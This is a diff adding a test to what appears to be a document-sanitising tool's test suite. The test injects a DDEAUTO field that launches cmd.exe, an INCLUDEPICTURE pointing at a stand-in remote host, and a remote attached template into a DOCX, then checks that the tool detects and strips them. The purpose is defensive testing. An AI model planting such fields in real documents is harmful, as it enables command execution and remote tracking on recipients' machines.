@@ -192,6 +192,46 @@ try {
       check('commented.docx: reopens in LibreOffice with comments removed', false, String(error).slice(0, 200));
     }
   }
+
+  // [F-2.1] Active content stripped, then reopened: LibreOffice's DOCX with a
+  // remote template, a DDE field and a field including a remote picture.
+  if (docxName) {
+    const parts = unzipSync(new Uint8Array(await readFile(join(dir, docxName))));
+    const R = 'http://schemas.openxmlformats.org/officeDocument/2006/relationships';
+    const field = (instr, shown) =>
+      `<w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText xml:space="preserve">${instr}</w:instrText></w:r><w:r><w:fldChar w:fldCharType="separate"/></w:r><w:r><w:t>${shown}</w:t></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r>`;
+    parts['word/document.xml'] = strToU8(
+      strFromU8(parts['word/document.xml']).replace(
+        /<w:body>/,
+        `<w:body><w:p>${field(' DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe "/k calc" ', 'Resultat DDE')}</w:p><w:p>${field(' INCLUDEPICTURE "http://pixel.example/p.png" ', 'Image distante')}</w:p>`,
+      ),
+    );
+    const settings = parts['word/settings.xml'] ? strFromU8(parts['word/settings.xml']) : null;
+    if (settings) {
+      parts['word/settings.xml'] = strToU8(
+        settings.replace(/<w:settings\b([^>]*)>/, (open, attrs) => `<w:settings${attrs.includes('xmlns:r=') ? attrs : `${attrs} xmlns:r="${R}"`}><w:attachedTemplate r:id="rIdTpl"/>`),
+      );
+      parts['word/_rels/settings.xml.rels'] = strToU8(
+        `<?xml version="1.0" encoding="UTF-8" standalone="yes"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rIdTpl" Type="${R}/attachedTemplate" Target="https://templates.example/report.dotm" TargetMode="External"/></Relationships>`,
+      );
+    }
+    const active = zipSync(parts);
+    const before = await inspectFile(active, 'active.docx');
+    check('active.docx: the DDE field is reported', before.findings.some((f) => f.label === 'DDE field (runs a command)'));
+    check('active.docx: the remote template is reported', !settings || before.findings.some((f) => f.label === 'Remote template loaded on opening'));
+    const stripped = await redactFile(active, 'active.docx', { stripActive: true });
+    await writeFile(join(dir, 'active.clean.docx'), stripped.data);
+    const out = join(dir, 'out-active');
+    try {
+      await soffice(['--convert-to', 'txt:Text', '--outdir', out, join(dir, 'active.clean.docx')], 'out-active');
+      const text = await readFile(join(out, 'active.clean.txt'), 'utf8');
+      check('active.docx: reopens in LibreOffice with active content stripped', text.includes('Resultat DDE'), text.slice(0, 120));
+      const xml = strFromU8(unzipSync(stripped.data)['word/document.xml']);
+      check('active.docx: no DDE or remote INCLUDE instruction is left', !/DDEAUTO|INCLUDEPICTURE/.test(xml));
+    } catch (error) {
+      check('active.docx: reopens in LibreOffice with active content stripped', false, String(error).slice(0, 200));
+    }
+  }
 } finally {
   await rm(dir, { recursive: true, force: true });
 }
